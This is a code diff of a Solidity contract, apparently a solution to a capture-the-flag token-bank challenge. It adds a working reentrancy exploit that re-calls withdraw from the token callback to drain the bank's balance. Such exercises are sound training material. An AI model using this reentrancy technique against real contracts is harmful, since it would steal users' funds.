@@ -120,13 +120,24 @@ contract TokenBankAttacker is ITokenReceiver {
     // Write your exploit functions here
 
     function attack() external {
-        challenge.addcontract(address(this));
-        uint256 amount = challenge.balanceOf(address(this));
-        challenge.withdraw(amount);
+        SimpleERC223Token token = challenge.token();
+        address player = challenge.player();
+        uint256 amount = token.allowance(player, address(this));
 
-        challenge.addcontract(address(this));
+        token.transferFrom(player, address(this), amount);
+        assert(token.balanceOf(address(challenge)) == 500_000e18);
+
+        token.transfer(address(challenge), amount);
+        assert(token.balanceOf(address(challenge)) == 1_000_000e18);
+
         challenge.withdraw(amount);
     }
 
-    function tokenFallback(address from, uint256 value, bytes memory data) public {}
+    function tokenFallback(address from, uint256 value, bytes memory data) public {
+        SimpleERC223Token token = challenge.token();
+        require(from == address(from));
+        uint256 amount = token.balanceOf(address(challenge));
+
+        if (amount > 0) challenge.withdraw(amount);
+    }
 }
